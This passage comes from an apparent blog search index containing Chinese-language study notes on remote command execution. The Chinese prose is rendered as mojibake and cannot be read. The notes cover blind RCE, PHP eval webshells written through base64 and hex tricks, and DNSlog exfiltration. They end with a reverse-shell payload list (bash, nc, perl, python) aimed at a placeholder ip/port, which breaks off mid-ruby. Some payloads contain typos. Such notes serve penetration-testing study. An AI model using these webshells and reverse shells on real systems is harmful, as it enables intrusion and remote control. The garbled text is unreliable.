´è§£</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œos-shellçš„è¿‡ç¨‹ä¸­ï¼Œsqlmapä¼šå‘ç½‘ç«™æ ¹ç›®å½•å†™å…¥ä¸¤ä¸ªæ–‡ä»¶ tmpblwkd.php å’Œ tmpueqch.phpã€‚çœŸæ­£çš„æœ¨é©¬æ–‡ä»¶æ˜¯tmpblwkd.php ã€‚å¦‚æœæ˜¯éæ­£å¸¸é€€å‡ºsqlmapçš„è¯ï¼Œè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚åªæœ‰å½“æˆ‘ä»¬è¾“å…¥ x æˆ– q é€€å‡º sqlmap æ—¶ï¼Œè¯¥æ–‡ä»¶æ‰ä¼šè¢«è‡ªåŠ¨åˆ é™¤</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCEè¡¥å……</title>
      <link href="/2023/07/26/RCE%E8%A1%A5%E5%85%85/"/>
      <url>/2023/07/26/RCE%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><a href="https://blog.csdn.net/weixin_46706771/article/details/119008895">RCEæ€»ç»“</a></p><h1 id="æ— å›æ˜¾rce"><a href="#æ— å›æ˜¾rce" class="headerlink" title="æ— å›æ˜¾rce"></a>æ— å›æ˜¾rce</h1><p><a href="https://blog.csdn.net/qq_45557476/article/details/121882666">rceæ— å›æ˜¾å‰–æ</a></p><ul><li>æ— å›æ˜¾rceï¼šåœ¨å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™ï¼Œè™½ç„¶å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†å´çœ‹ä¸åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œä¹Ÿä¸çŸ¥é“å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œ</li><li>å¯ä»¥ä½¿ç”¨sleepå‘½ä»¤é€šè¿‡æ˜¯å¦å»¶æ—¶æ¥åˆ¤æ–­è¯¥æ¡å‘½ä»¤æ˜¯å¦æœ‰æ‰§è¡Œï¼Œæœ‰å»¶æ—¶åˆ™ä»£è¡¨å‘½ä»¤æœ‰æ‰§è¡Œï¼š<code>?a=1;sleep 5</code></li></ul><h2 id="ä¸€å¥è¯æœ¨é©¬"><a href="#ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬"></a>ä¸€å¥è¯æœ¨é©¬</h2><h3 id="å¯è¾“å…¥é•¿åº¦è¢«é™åˆ¶"><a href="#å¯è¾“å…¥é•¿åº¦è¢«é™åˆ¶" class="headerlink" title="å¯è¾“å…¥é•¿åº¦è¢«é™åˆ¶"></a>å¯è¾“å…¥é•¿åº¦è¢«é™åˆ¶</h3><ul><li><p>linuxçš„ä¸€äº›ç‰¹æ€§</p><ul><li><code>&gt;a</code>ï¼šè™½ç„¶æ²¡æœ‰è¾“å…¥ä½†æ˜¯ä¼šåˆ›å»ºaè¿™ä¸ªæ–‡ä»¶</li><li><code>ls -t ls</code>ï¼šåŸºäºäº‹ä»¶æ’åºï¼ˆä»æ™šåˆ°æ—©ï¼‰</li><li><code>sh a</code>ï¼šshä¼šæŠŠaé‡Œé¢çš„æ¯è¡Œå†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œä½¿ç”¨<code>|</code>è¿›è¡Œå‘½ä»¤æ‹¼æ¥<code>#l\ s = ls</code></li><li><code>base64</code>ä½¿ç”¨base64ç¼–ç é¿å…ç‰¹æ®Šå­—ç¬¦</li></ul></li><li><p>å¯å†™ï¼š<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p></li><li><p>å°†è¯­å¥æ‹†åˆ†å†™å…¥ï¼ˆæœ€åä¸¤å¥æ˜¯é‡ç‚¹ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">hp  &gt;1.p\\  &gt;d\&gt;\\  &gt;\ -\\  &gt;e64\\  &gt;bas\\  &gt;7\|\\  &gt;XSk\\  &gt;Fsx\\&gt;dFV\\  &gt;kX0\\  &gt;bCg\\  &gt;XZh\\  &gt;AgZ\\  &gt;waH\\  &gt;PD9\\  &gt;o\ \\  &gt;ech\\<span class="built_in">ls</span> -t&gt;0sh 0</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="æ²¡æœ‰é™åˆ¶ä¸”æœ‰å†™å…¥æƒé™"><a href="#æ²¡æœ‰é™åˆ¶ä¸”æœ‰å†™å…¥æƒé™" class="headerlink" title="æ²¡æœ‰é™åˆ¶ä¸”æœ‰å†™å…¥æƒé™"></a>æ²¡æœ‰é™åˆ¶ä¸”æœ‰å†™å…¥æƒé™</h3><ul><li><code>echo &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; fuck.php</code></li></ul><h3 id="å¤åˆ¶ã€å‹ç¼©çš„æ–¹æ³•"><a href="#å¤åˆ¶ã€å‹ç¼©çš„æ–¹æ³•" class="headerlink" title="å¤åˆ¶ã€å‹ç¼©çš„æ–¹æ³•"></a>å¤åˆ¶ã€å‹ç¼©çš„æ–¹æ³•</h3><ul><li><code>copy flag.php 1.txt</code></li><li><code>mv flag.php flag.txt</code></li><li><code>cat flag.php &gt; flag.txt</code></li><li><code>tar cvf flag.tar flag.php</code></li><li><code>tar zcvf flag.tar.gz flag.php</code></li><li><code>echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php</code></li></ul><h2 id="DNSlogå¤–å¸¦"><a href="#DNSlogå¤–å¸¦" class="headerlink" title="DNSlogå¤–å¸¦"></a>DNSlogå¤–å¸¦</h2><ul><li>å¦‚æœæˆ‘ä»¬å‘èµ·è¯·æ±‚çš„ç›®æ ‡ä¸æ˜¯IPåœ°å€è€Œæ˜¯åŸŸåçš„è¯ï¼Œå°±ä¸€å®šä¼šå‘ç”Ÿä¸€æ¬¡åŸŸåè§£æ</li></ul><ul><li>é‚£ä¹ˆå‡å¦‚æœ‰ä¸€ä¸ªå¯æ§çš„äºŒçº§åŸŸåï¼Œé‚£ä¹ˆå½“å®ƒå‘ä¸‹ä¸€å±‚åŸŸåå‘èµ·è§£æçš„æ—¶å€™ï¼Œå°±èƒ½æ‹¿åˆ°å®ƒçš„åŸŸåè§£æè¯·æ±‚</li><li>è¿™å°±ç›¸å½“äºé…åˆdnsè¯·æ±‚å®Œæˆå¯¹å‘½ä»¤æ‰§è¡Œçš„åˆ¤æ–­ï¼Œè¿™å°±ç§°ä¹‹ä¸ºdnslogï¼Œå‘èµ·ä¸€ä¸ªdnsè¯·æ±‚éœ€è¦é€šè¿‡linuxä¸­çš„<code>ping</code>å‘½ä»¤æˆ–è€…<code>curl</code>å‘½ä»¤</li><li>éœ€è¦äº†è§£çš„ä¸€äº›å‘½ä»¤ï¼š<ul><li><code>sed</code>å‘½ä»¤ï¼Œå¯ä»¥å®ç°å¯¹è¡Œçš„åˆ†ï¼šls | sed -n â€˜1pâ€™ ï¼ˆæ˜¾ç¤ºç¬¬ä¸€è¡Œï¼‰</li><li><code>find</code><ul><li>-nameï¼šæŒ‰åç§°æŸ¥æ‰¾ï¼›æ ¹æ®ç›®æ ‡æ–‡ä»¶çš„åç§°è¿›è¡ŒæŸ¥æ‰¾ï¼Œå…è®¸ä½¿ç”¨<code>*</code>åŠ<code>?</code>é€šé…ç¬¦</li><li>-sizeï¼šæŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾ï¼›ä¸€èˆ¬ä½¿ç”¨<code>+</code>ã€<code>-</code>å·è®¾ç½®è¶…è¿‡æˆ–å°äºæŒ‡å®šçš„å¤§å°ä½œä¸ºæŸ¥æ‰¾æ¡ä»¶ï¼Œå¸¸ç”¨çš„å®¹é‡å•ä½åŒ…æ‹¬kBï¼ˆæ³¨æ„kæ˜¯å°å†™ï¼‰ã€MBã€GBï¼›</li><li>-userï¼šæŒ‰æ–‡ä»¶å±ä¸»æŸ¥æ‰¾ï¼›</li><li>-typeï¼šæŒ‰æ–‡ä»¶ç±»å‹æŸ¥æ‰¾ï¼›ç±»å‹æŒ‡çš„æ˜¯æ™®é€šæ–‡ä»¶ï¼ˆfï¼‰ã€ç›®å½•ï¼ˆdï¼‰ã€å—è®¾å¤‡æ–‡ä»¶ï¼ˆbï¼‰ã€å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼ˆcï¼‰ç­‰</li></ul></li><li><a href="https://www.cnblogs.com/ysuwangqiang/p/11364173.html#:~:text=Linuxä¸­é€šé…ç¬¦. ã€€ã€€é€šé…ç¬¦æ˜¯ç”±shellå¤„ç†çš„%2C å®ƒåªä¼šå‡ºç°åœ¨ å‘½ä»¤çš„â€œå‚æ•°â€é‡Œã€‚. å½“shellåœ¨â€œå‚æ•°â€ä¸­é‡åˆ°äº†é€šé…ç¬¦æ—¶ï¼Œshellä¼šå°†å…¶å½“ä½œè·¯å¾„æˆ–æ–‡ä»¶åå»åœ¨ç£ç›˜ä¸Šæœå¯»å¯èƒ½çš„åŒ¹é…ï¼šè‹¥ç¬¦åˆè¦æ±‚çš„åŒ¹é…å­˜åœ¨ï¼Œåˆ™è¿›è¡Œä»£æ¢(è·¯å¾„æ‰©å±•">Linuxå‘½ä»¤é€šé…ç¬¦</a>ï¼›å¦åˆ™å°±å°†è¯¥é€šé…ç¬¦ä½œä¸ºä¸€ä¸ªæ™®é€šå­—ç¬¦ä¼ é€’ç»™â€œå‘½ä»¤â€ï¼Œç„¶åå†ç”±å‘½ä»¤è¿›è¡Œå¤„ç†ã€‚. æ€»ä¹‹ï¼Œé€šé…ç¬¦ å®é™…ä¸Šå°±æ˜¯ä¸€ç§shellå®ç°çš„è·¯å¾„æ‰©å±•åŠŸèƒ½ã€‚. åœ¨,SHELLä¸­çš„é€šé…ç¬¦. å¸®åŠ©æ‰‹å†Œï¼š%23 man 7 glob . åŒ¹é…ä»»æ„é•¿åº¦çš„ä»»æ„å­—ç¬¦ï¼Œå¯ä»¥æ˜¯0ä¸ª. åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œå¿…é¡»æ˜¯1ä¸ª.)</li></ul></li></ul><h1 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h1><h2 id="ä»€ä¹ˆæ˜¯åå¼¹sellï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯åå¼¹sellï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯åå¼¹sellï¼Ÿ"></a>ä»€ä¹ˆæ˜¯åå¼¹sellï¼Ÿ</h2><blockquote><p>é€šä¿—æ¥è¯´ï¼Œshellå°±æ˜¯å®ç°ç”¨æˆ·å‘½ä»¤çš„æ¥å£ï¼Œé€šè¿‡è¯¥æ¥å£æˆ‘ä»¬èƒ½å®ç°å¯¹è®¡ç®—æœºçš„æ§åˆ¶(rootæƒé™)ï¼Œè€Œåå¼¹shellå°±æ˜¯å°†shellåå¼¹ç»™æ”»å‡»è€…ï¼Œä»è€Œè¾¾åˆ°è®©æ”»å‡»è€…å¯ä»¥åœ¨è‡ªå·±çš„æœºå™¨ä¸Šæ‰§è¡Œshellå‘½ä»¤ï¼Œä»è€Œæ“æ§å—å®³è€…çš„è®¡ç®—æœºã€‚</p></blockquote><h2 id="ä¸ºä»€ä¹ˆè¦åå¼¹shellï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦åå¼¹shellï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åå¼¹shellï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦åå¼¹shellï¼Ÿ</h2><blockquote><p>é€šå¸¸ç”¨äºè¢«æ§ç«¯å› é˜²ç«å¢™å—é™ã€æƒé™ä¸è¶³ã€ç«¯å£è¢«å ç”¨ç­‰æƒ…å½¢</p><p>å‡è®¾æˆ‘ä»¬æ”»å‡»äº†ä¸€å°æœºå™¨ï¼Œæ‰“å¼€äº†è¯¥æœºå™¨çš„ä¸€ä¸ªç«¯å£ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„æœºå™¨å»è¿æ¥ç›®æ ‡æœºå™¨ï¼ˆç›®æ ‡ipï¼šç›®æ ‡æœºå™¨ç«¯å£ï¼‰ï¼Œè¿™æ˜¯æ¯”è¾ƒå¸¸è§„çš„å½¢å¼ï¼Œæˆ‘ä»¬å«åšæ­£å‘è¿æ¥ã€‚è¿œç¨‹æ¡Œé¢ï¼ŒwebæœåŠ¡ï¼Œsshï¼Œtelnetç­‰ç­‰ï¼Œéƒ½æ˜¯æ­£å‘è¿æ¥ã€‚é‚£ä¹ˆä»€ä¹ˆæƒ…å†µä¸‹æ­£å‘è¿æ¥ä¸å¤ªå¥½ç”¨äº†å‘¢ï¼Ÿ</p><p>1.æŸå®¢æˆ·æœºä¸­äº†ä½ çš„ç½‘é©¬ï¼Œä½†æ˜¯å®ƒåœ¨å±€åŸŸç½‘å†…ï¼Œä½ ç›´æ¥è¿æ¥ä¸äº†ã€‚</p><p>2.å®ƒçš„ipä¼šåŠ¨æ€æ”¹å˜ï¼Œä½ ä¸èƒ½æŒç»­æ§åˆ¶ã€‚</p><p>3.ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚ã€‚</p><p>4.å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥ï¼Œæ‰€ä»¥å»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</p><p>é‚£ä¹ˆåå¼¹å°±å¾ˆå¥½ç†è§£äº†ï¼Œ æ”»å‡»è€…æŒ‡å®šæœåŠ¡ç«¯ï¼Œå—å®³è€…ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„æœåŠ¡ç«¯ç¨‹åºï¼Œå°±å«åå¼¹è¿æ¥ã€‚</p></blockquote><h2 id="linuxæ–‡ä»¶æè¿°ç¬¦"><a href="#linuxæ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="linuxæ–‡ä»¶æè¿°ç¬¦"></a>linuxæ–‡ä»¶æè¿°ç¬¦</h2><ul><li><p>å¯ä»¥ç†è§£ä¸ºlinuxè·Ÿè¸ªæ‰“å¼€æ–‡ä»¶ï¼Œè€Œåˆ†é…çš„ä¸€ä¸ªæ•°å­—ï¼Œè¿™ä¸ªæ•°å­—æœ‰ç‚¹ç±»ä¼¼cè¯­è¨€æ“ä½œæ–‡ä»¶æ—¶å€™çš„å¥æŸ„ï¼Œé€šè¿‡å¥æŸ„å°±å¯ä»¥å®ç°æ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚</p></li><li><p>å½“Linuxå¯åŠ¨çš„æ—¶å€™ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦(0,1,2)</p></li></ul><blockquote><p>æ ‡å‡†è¾“å…¥standard input 0 ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰<br>æ ‡å‡†è¾“å‡ºstandard output 1ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰<br>é”™è¯¯è¾“å‡ºï¼šerror output 2ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰</p></blockquote><ul><li>æ³¨æ„ï¼š<ul><li>ä»¥åå†æ‰“å¼€æ–‡ä»¶ï¼Œæè¿°ç¬¦å¯ä»¥ä¾æ¬¡å¢åŠ </li><li>ä¸€æ¡shellå‘½ä»¤ï¼Œéƒ½ä¼šç»§æ‰¿å…¶çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå› æ­¤æ‰€æœ‰çš„shellå‘½ä»¤ï¼Œéƒ½ä¼šé»˜è®¤æœ‰ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</li><li>æ–‡ä»¶æ‰€æœ‰è¾“å…¥è¾“å‡ºéƒ½æ˜¯ç”±è¯¥è¿›ç¨‹æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶çš„ã€‚</li></ul></li></ul><h2 id="é‡å®šå‘"><a href="#é‡å®šå‘" class="headerlink" title="é‡å®šå‘"></a>é‡å®šå‘</h2><ul><li><p>è¾“å…¥è¾“å‡ºæ“ä½œéƒ½æ˜¯ä¾èµ–æ–‡ä»¶æè¿°ç¬¦å®ç°çš„ï¼Œé‡å®šå‘è¾“å…¥è¾“å‡ºæœ¬è´¨ä¸Šå°±æ˜¯é‡å®šå‘æ–‡ä»¶æè¿°ç¬¦</p></li><li><p>é‡å®šå‘ä¸»è¦åˆ†ä¸ºä¸¤ç§(å…¶ä»–å¤æ‚çš„éƒ½æ˜¯ä»è¿™ä¸¤ç§è¡ç”Ÿè€Œæ¥çš„)ï¼š</p><ul><li>è¾“å…¥é‡å®šå‘ <code>&lt; &lt;&lt;</code></li><li>è¾“å‡ºé‡å®šå‘ <code>&gt; &gt;&gt;</code></li></ul></li><li><p>é‡ç‚¹ï¼š</p><ul><li>bash åœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæ£€æŸ¥å‘½ä»¤ä¸­å­˜ä¸å­˜åœ¨é‡å®šå‘çš„ç¬¦å·ï¼Œå¦‚æœå­˜åœ¨é‚£ä¹ˆé¦–å…ˆå°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘ï¼Œç„¶ååœ¨æŠŠé‡å®šå‘å»æ‰ï¼Œæ‰§è¡ŒæŒ‡ä»¤</li><li>å¦‚æœæŒ‡ä»¤ä¸­å­˜åœ¨å¤šä¸ªé‡å®šå‘ï¼Œé‚£ä¹ˆä¸è¦éšä¾¿æ”¹å˜é¡ºåºï¼Œå› ä¸ºé‡å®šå‘æ˜¯ä»å·¦å‘å³è§£æçš„ï¼Œæ”¹å˜é¡ºåºå¯èƒ½ä¼šå¸¦æ¥å®Œå…¨ä¸åŒçš„ç»“æœ</li><li><code>&lt;</code>æ˜¯å¯¹æ ‡å‡†è¾“å…¥ 0 é‡å®šå‘ ï¼Œ<code>&gt;</code>æ˜¯å¯¹æ ‡å‡†è¾“å‡º 1 é‡å®šå‘</li><li>é‡å®šå‘å°±æ˜¯é’ˆå¯¹æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œ</li></ul></li></ul><h3 id="è¾“å…¥é‡å®šå‘"><a href="#è¾“å…¥é‡å®šå‘" class="headerlink" title="è¾“å…¥é‡å®šå‘"></a>è¾“å…¥é‡å®šå‘</h3><p>æ ¼å¼ï¼š<code>[n]&lt; word</code>ï¼ˆæ³¨æ„[n]ä¸&lt;ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼‰</p><p>è¯´æ˜ï¼šå°†æ–‡ä»¶æè¿°ç¬¦ n é‡å®šå‘åˆ° word æŒ‡ä»£çš„æ–‡ä»¶ï¼ˆä»¥åªè¯»æ–¹å¼æ‰“å¼€ï¼‰,å¦‚æœnçœç•¥å°±æ˜¯0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰</p><h3 id="è¾“å‡ºé‡å®šå‘"><a href="#è¾“å‡ºé‡å®šå‘" class="headerlink" title="è¾“å‡ºé‡å®šå‘"></a>è¾“å‡ºé‡å®šå‘</h3><p>æ ¼å¼ï¼š<code>[n]&gt; word</code></p><p>è¯´æ˜ï¼š å°†æ–‡ä»¶æè¿°ç¬¦ n é‡å®šå‘åˆ°word æŒ‡ä»£çš„æ–‡ä»¶ï¼ˆä»¥å†™çš„æ–¹å¼æ‰“å¼€ï¼‰ï¼Œå¦‚æœn çœç•¥åˆ™é»˜è®¤å°±æ˜¯ 1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</p><h3 id="æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘"><a href="#æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘" class="headerlink" title="æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘"></a>æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘</h3><p>æ ¼å¼ï¼š<code>&amp;&gt; word &gt;&amp; word</code></p><p>è¯´æ˜ï¼šå°†æ ‡å‡†è¾“å‡ºä¸æ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½å®šå‘åˆ°wordä»£è¡¨çš„æ–‡ä»¶ï¼ˆä»¥å†™çš„æ–¹å¼æ‰“å¼€ï¼‰ï¼Œä¸¤ç§æ ¼å¼æ„ä¹‰å®Œå…¨ç›¸åŒï¼Œè¿™ç§æ ¼å¼å®Œå…¨ç­‰ä»·äº<code>&gt; word 2&gt;&amp;1</code>ï¼ˆ2&gt;&amp;1æ˜¯å°†æ ‡å‡†é”™è¯¯è¾“å‡ºå¤åˆ¶åˆ°æ ‡å‡†è¾“å‡ºï¼Œ&amp;æ˜¯ä¸ºäº†åŒºåˆ†æ–‡ä»¶1å’Œæ–‡ä»¶æè¿°ç¬¦1çš„ï¼‰</p><h3 id="æ–‡ä»¶æè¿°ç¬¦çš„å¤åˆ¶"><a href="#æ–‡ä»¶æè¿°ç¬¦çš„å¤åˆ¶" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦çš„å¤åˆ¶"></a>æ–‡ä»¶æè¿°ç¬¦çš„å¤åˆ¶</h3><p>æ ¼å¼ï¼š<code>[n]&lt;&amp;[m] / [n]&gt;&amp;[m]</code>(è¿™é‡Œæ‰€æœ‰å­—ç¬¦ä¹‹é—´ä¸è¦æœ‰ç©ºæ ¼)</p><p>è¯´æ˜ï¼š</p><blockquote><p>è¿™é‡Œä¸¤ä¸ªéƒ½æ˜¯å°†æ–‡ä»¶æè¿°ç¬¦ n å¤åˆ¶åˆ° m ï¼Œä¸¤è€…çš„åŒºåˆ«æ˜¯ï¼Œå‰è€…æ˜¯ä»¥åªè¯»çš„å½¢å¼æ‰“å¼€ï¼Œåè€…æ˜¯ä»¥å†™çš„å½¢å¼æ‰“å¼€</p><p>å› æ­¤ 0&lt;&amp;1 å’Œ 0&gt;&amp;1 æ˜¯å®Œå…¨ç­‰ä»·çš„ï¼ˆè¯»/å†™æ–¹å¼æ‰“å¼€å¯¹å…¶æ²¡æœ‰ä»»ä½•å½±å“ï¼‰</p><p>è¿™é‡Œçš„&amp; ç›®çš„æ˜¯ä¸ºäº†åŒºåˆ†æ•°å­—åå­—çš„æ–‡ä»¶å’Œæ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœæ²¡æœ‰&amp; ç³»ç»Ÿä¼šè®¤ä¸ºæ˜¯å°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘åˆ°äº†ä¸€ä¸ªæ•°å­—ä½œä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦</p></blockquote><h3 id="exec-ç»‘å®šé‡å®šå‘"><a href="#exec-ç»‘å®šé‡å®šå‘" class="headerlink" title="exec ç»‘å®šé‡å®šå‘"></a>exec ç»‘å®šé‡å®šå‘</h3><p>æ ¼å¼ï¼š<code>exec [n] &lt;/&gt; file/[n]</code></p><p>è¯´æ˜ï¼šä¸Šé¢çš„è¾“å…¥è¾“å‡ºé‡å®šå‘å°†è¾“å…¥å’Œè¾“å‡ºç»‘å®šæ–‡ä»¶æˆ–è€…è®¾å¤‡ä»¥ååªå¯¹å½“å‰çš„é‚£æ¡æŒ‡ä»¤æœ‰æ•ˆï¼Œå¦‚æœéœ€è¦æ¥ä¸‹æ¥çš„æŒ‡ä»¤éƒ½æ”¯æŒçš„è¯å°±éœ€è¦ä½¿ç”¨ exec æŒ‡ä»¤</p><ul><li>é‡ç‚¹ï¼š<ul><li>æ ¼å¼ï¼š<code>[n]&lt;&gt;word</code></li><li>è¯´æ˜ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€wordæŒ‡ä»£çš„æ–‡ä»¶ï¼Œå¹¶å°†né‡å®šå‘åˆ°è¯¥æ–‡ä»¶ã€‚å¦‚æœnä¸æŒ‡å®šçš„è¯ï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥ã€‚</li></ul></li></ul><h2 id="å¸¸è§çš„åå¼¹shell"><a href="#å¸¸è§çš„åå¼¹shell" class="headerlink" title="å¸¸è§çš„åå¼¹shell"></a>å¸¸è§çš„åå¼¹shell</h2><h3 id="bashåå¼¹"><a href="#bashåå¼¹" class="headerlink" title="bashåå¼¹"></a>bashåå¼¹</h3><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port</code></p></blockquote><ul><li>å°†å—å®³ç«¯çš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»ç«¯ï¼Œä½†æ˜¯è¿˜æ²¡å®ç°ç”¨å‘½ä»¤æ§åˆ¶å—å®³ç«¯ã€‚</li></ul><blockquote><p><code>bash -i &lt; /dev/tcp/ip/port</code></p></blockquote><ul><li>å°†æ”»å‡»ç«¯çš„è¾“å…¥é‡å®šå‘åˆ°å—å®³ç«¯ï¼Œä½†æ˜¯æ”»å‡»ç«¯çœ‹ä¸åˆ°å‘½ä»¤æ‰§è¡Œç»“æœã€‚</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><ul><li>åŸºæœ¬å®ç°äº†åå¼¹shellçš„åŠŸèƒ½ã€‚ä½†æ˜¯å—å®³ç«¯çš„æœºå™¨ä¸Šä¾ç„¶å›æ˜¾äº†æ”»å‡»è€…æœºå™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤ï¼Œä¸”æ”»å‡»ç«¯çœ‹ä¸åˆ°é”™è¯¯å‘½ä»¤çš„è¾“å‡ºã€‚</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p></blockquote><ul><li>æ”»å‡»ç«¯å·²è·å¾—å—å®³ç«¯çš„è¿œç¨‹äº¤äº’å¼shellï¼Œè€Œä¸”å—å®³ç«¯æ²¡æœ‰å†å›æ˜¾æ”»å‡»ç«¯è¾“å…¥çš„å‘½ä»¤ã€‚</li></ul><h3 id="ncå‘½ä»¤"><a href="#ncå‘½ä»¤" class="headerlink" title="ncå‘½ä»¤"></a>ncå‘½ä»¤</h3><blockquote><p><code>nc -e /bin/bash ip port</code>ï¼šncåå¼¹</p><p><code>nc -lvp port</code>ï¼šç›‘å¬ç«¯å£</p></blockquote><h3 id="amp-ã€-amp-gt"><a href="#amp-ã€-amp-gt" class="headerlink" title=">&amp;ã€&amp;&gt;"></a>>&amp;ã€&amp;&gt;</h3><ul><li>è§£å†³å—å®³æœºèƒ½çœ‹åˆ°æ”»å‡»æœºæ‰§è¡Œå‘½ä»¤çš„æƒ…å†µ</li></ul><blockquote><p><code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1</code></p><p><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p></blockquote><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p><strong>Bashåå¼¹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><strong>Perlåå¼¹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,get-protobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p><strong>Pythonåå¼¹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><strong>Rubyåå¼¹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e 